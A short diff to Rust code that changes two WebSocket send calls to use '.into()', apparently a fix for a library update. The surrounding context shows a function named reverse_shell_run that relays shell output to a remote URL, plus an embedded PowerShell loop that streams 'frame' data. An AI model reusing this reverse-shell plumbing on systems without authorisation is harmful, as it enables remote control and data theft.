@@ -130,7 +130,7 @@ async fn reverse_shell_run(url: &str) -> Result<(), Box<dyn std::error::Error + 
                 Ok(0) | Err(_) => break,
                 Ok(n) => {
                     let text = String::from_utf8_lossy(&buf[..n]).to_string();
-                    if tx.send(Message::Text(text)).await.is_err() { break; }
+                    if tx.send(Message::Text(text.into())).await.is_err() { break; }
                 }
             }
         }
@@ -209,7 +209,7 @@ while ($true) {
                     r#"{{"type":"frame","timestamp":{},"data":"{}"}}"#,
                     ts, line
                 );
-                if ws_write.send(Message::Text(payload)).await.is_err() { break; }
+                if ws_write.send(Message::Text(payload.into())).await.is_err() { break; }
             }
             Ok(None) | Err(_) => break,
             _ => {}
